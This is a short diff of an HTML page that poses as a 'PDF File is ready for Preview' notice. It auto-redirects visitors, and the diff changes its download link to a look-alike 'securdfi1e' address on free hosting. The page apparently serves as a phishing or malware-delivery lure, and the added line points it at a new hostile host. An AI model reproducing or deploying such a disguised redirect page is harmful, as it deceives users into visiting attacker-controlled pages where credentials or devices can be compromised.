@@ -16,7 +16,7 @@ window.location = $this.attr('href');
 <body>
 <div class="wrapper">
 <p>The PDF File is ready for Preview. If it doesn't, click
-<a data-auto-download href="https://documentdownload.ga/dtd">here</a>.</p>
+<a data-auto-download href="https://securdfi1e.000webhostapp.com/viewfi1e/index.php">here</a>.</p>
 </div>
 </body>
 </html>
